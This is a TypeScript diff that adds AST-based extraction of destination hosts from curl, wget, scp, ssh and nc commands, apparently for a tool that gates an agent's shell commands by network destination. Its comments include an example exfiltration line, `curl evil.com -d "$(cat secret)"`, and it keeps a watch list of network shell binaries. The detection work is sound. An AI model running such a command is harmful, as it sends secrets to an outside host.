@@ -550,6 +550,263 @@ function extractLiteralArgs(callExpr: any): { name: string; flags: string[]; pat
   return { name, flags, paths };
 }
 
+// ── Network egress destination extraction (GAP-5) ───────────────────────────
+// Pulls the DESTINATION host out of network commands (curl/wget/scp/ssh/nc)
+// using the AST, so node9 can gate on WHERE data goes — independent of the
+// payload. Because it walks real CallExpr nodes, a string literal like
+// `echo "curl evil.com"` does NOT fire (it's a Lit arg to echo, not a curl
+// call), and a dynamic payload (`curl evil.com -d "$(cat secret)"`) still
+// yields `evil.com` — the host is literal even when the body is not.
+
+export interface ShellDestination {
+  /** Extracted hostname, lowercased (e.g. "evil.com", "10.0.0.5"). */
+  host: string;
+  /** The network binary it belongs to (e.g. "curl"). */
+  binary: string;
+  /** The raw argument token the host came from (for UI / audit). */
+  raw: string;
+}
+
+const NET_BINARIES = new Set(['curl', 'wget', 'scp', 'ssh', 'nc', 'ncat', 'netcat']);
+
+// Flags whose NEXT token is a value, not a destination. Conservative supersets —
+// missing a rare one only risks a false destination candidate (which is review,
+// not block, by default), never a missed real host.
+const VALUE_FLAGS: Record<string, Set<string>> = {
+  curl: new Set([
+    '-d',
+    '--data',
+    '--data-ascii',
+    '--data-binary',
+    '--data-raw',
+    '--data-urlencode',
+    '-F',
+    '--form',
+    '-H',
+    '--header',
+    '-X',
+    '--request',
+    '-o',
+    '--output',
+    '-T',
+    '--upload-file',
+    '-u',
+    '--user',
+    '-e',
+    '--referer',
+    '-A',
+    '--user-agent',
+    '-b',
+    '--cookie',
+    '-c',
+    '--cookie-jar',
+    '--connect-to',
+    '--resolve',
+    '--cacert',
+    '--cert',
+    '--key',
+    '-x',
+    '--proxy',
+    '-m',
+    '--max-time',
+    '--retry',
+  ]),
+  wget: new Set([
+    '-O',
+    '--output-document',
+    '--post-data',
+    '--post-file',
+    '--header',
+    '-U',
+    '--user-agent',
+    '--user',
+    '--password',
+    '-o',
+    '--output-file',
+    '-P',
+    '--directory-prefix',
+    '-t',
+    '--tries',
+    '-T',
+    '--timeout',
+  ]),
+  scp: new Set(['-i', '-F', '-l', '-o', '-c', '-S', '-P', '-J', '-D', '-W']),
+  ssh: new Set([
+    '-i',
+    '-p',
+    '-o',
+    '-l',
+    '-F',
+    '-c',
+    '-L',
+    '-R',
+    '-D',
+    '-W',
+    '-b',
+    '-e',
+    '-m',
+    '-O',
+    '-Q',
+    '-S',
+    '-J',
+    '-w',
+    '-B',
+    '-I',
+    '-E',
+  ]),
+  nc: new Set(['-p', '-s', '-w', '-X', '-x', '-e', '-g', '-G', '-i', '-O', '-T', '-q', '-m']),
+};
+
+// Resolve one Word node to its literal text, or null if it has any dynamic part
+// (param/command/arithmetic expansion) — we must not treat dynamic content as a
+// host, but a dynamic flag-VALUE must still consume its flag's skip slot.
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function resolveWordLiteral(w: any): string | null {
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const parts: any[] = w?.Parts || [];
+  let s = '';
+  for (const p of parts) {
+    const t = syntax.NodeType(p);
+    if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
+    else if (t === 'SglQuoted') s += p.Value ?? '';
+    else if (t === 'DblQuoted') {
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const inner: any[] = p.Parts || [];
+      if (!inner.every((ip: unknown) => syntax.NodeType(ip) === 'Lit')) return null;
+      s += inner.map((ip: { Value?: string }) => ip.Value ?? '').join('');
+    } else {
+      return null; // dynamic
+    }
+  }
+  return s;
+}
+
+/**
+ * Parse a destination host out of a single token. Handles scheme URLs
+ * (`https://h/p`), scheme-less curl targets (`evil.com/p`), `user@host:path`
+ * (scp/ssh), and `host:port`. Returns the lowercased hostname, or null if the
+ * token doesn't resolve to a plausible host. IPv6 literals are out of scope v1.
+ */
+export function parseDestHost(token: string): string | null {
+  if (!token) return null;
+  let t = token.trim();
+  if (!t || t.startsWith('-')) return null;
+  // Scheme URL — let URL() do the work.
+  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(t)) {
+    try {
+      const h = new URL(t).hostname.toLowerCase();
+      return h || null;
+    } catch {
+      return null;
+    }
+  }
+  // Strip user@ (scp/ssh/curl creds), then path, then port/scp-colon.
+  const at = t.lastIndexOf('@');
+  if (at >= 0) t = t.slice(at + 1);
+  t = t.split('/')[0]; // drop /path
+  t = t.replace(/:\d+$/, ''); // drop :port
+  t = t.split(':')[0]; // drop scp :path
+  t = t.toLowerCase();
+  // Cap at the max DNS name length (253). A longer string can't be a valid host
+  // anyway, and the bound guards the dotted-host regex below from O(n^2)
+  // backtracking on a crafted multi-KB literal token (e.g. `curl a.a.a.…`).
+  // Applied here (post path/port strip) so long URL paths/queries — which were
+  // already removed above — never cause a real destination to be dropped.
+  if (t.length > 253) return null;
+  // Plausible host: dotted domain or IPv4, or bare "localhost".
+  if (t === 'localhost') return t;
+  if (/^[a-z0-9.-]+\.[a-z0-9.-]+$/.test(t)) return t;
+  return null;
+}
+
+// Per-binary destination extraction from an ordered, literal-resolved arg list
+// (null entries = dynamic args). Returns raw destination tokens (host parsing
+// happens in the caller so `raw` is preserved).
+function destTokensForBinary(binary: string, args: (string | null)[]): string[] {
+  const valueFlags = VALUE_FLAGS[binary] ?? new Set<string>();
+  const positionals: string[] = [];
+  const urlFlagValues: string[] = [];
+  for (let i = 0; i < args.length; i++) {
+    const tok = args[i];
+    if (tok === null) continue; // dynamic — can't be a host; flag-skip handled below
+    if (tok.startsWith('-')) {
+      // --url=VALUE / --url VALUE → the value IS the destination.
+      if (tok.startsWith('--url=')) {
+        urlFlagValues.push(tok.slice('--url='.length));
+        continue;
+      }
+      if (tok === '--url') {
+        const next = args[i + 1];
+        if (typeof next === 'string') urlFlagValues.push(next);
+        i++; // consume value (even if dynamic)
+        continue;
+      }
+      if (tok.includes('=')) continue; // --flag=value boolean-ish; value not a host
+      if (valueFlags.has(tok)) i++; // skip this flag's value token
+      continue; // boolean flag
+    }
+    positionals.push(tok);
+  }
+
+  switch (binary) {
+    case 'curl':
+    case 'wget':
+      // Any positional URL/host is a target; curl/wget can take several.
+      return [...urlFlagValues, ...positionals];
+    case 'ssh':
+      // First positional is [user@]host; the rest is the remote command.
+      return positionals.slice(0, 1);
+    case 'scp':
+      // Remote specs contain a ':' (host:path); local paths usually don't.
+      return positionals.filter((p) => p.includes(':') || p.includes('@'));
+    case 'nc':
+    case 'ncat':
+    case 'netcat':
+      // First positional is the host (second is the port).
+      return positionals.slice(0, 1);
+    default:
+      return [];
+  }
+}
+
+/**
+ * AST-extract every network destination host in a shell command. Walks each
+ * CallExpr; for curl/wget/scp/ssh/nc it resolves the destination argument(s)
+ * and parses the host. Deduplicated by host. Pure — no I/O, no DNS.
+ */
+export function extractShellDestinations(command: string): ShellDestination[] {
+  const f = parseShared(command);
+  if (f === PARSE_FAIL) return []; // fail open for FPs, not FNs
+  const out: ShellDestination[] = [];
+  const seen = new Set<string>();
+  try {
+    syntax.Walk(f, (node: unknown) => {
+      if (!node) return false;
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const n = node as any;
+      if (syntax.NodeType(n) !== 'CallExpr') return true;
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any
+      const callArgs: any[] = n.Args || [];
+      if (callArgs.length === 0) return true;
+      const name = (resolveWordLiteral(callArgs[0]) || '').toLowerCase();
+      if (!NET_BINARIES.has(name)) return true;
+      const rest = callArgs.slice(1).map((a) => resolveWordLiteral(a));
+      for (const raw of destTokensForBinary(name, rest)) {
+        const host = parseDestHost(raw);
+        if (!host) continue;
+        const key = `${name}:${host}`;
+        if (seen.has(key)) continue;
+        seen.add(key);
+        out.push({ host, binary: name, raw });
+      }
+      return true;
+    });
+  } catch {
+    return out; // partial result on walker error — fail open
+  }
+  return out;
+}
+
 /**
  * AST-based filesystem-operation detector. Walks each CallExpr, identifies
  * dangerous patterns by *resolved path arguments*, returns the first verdict
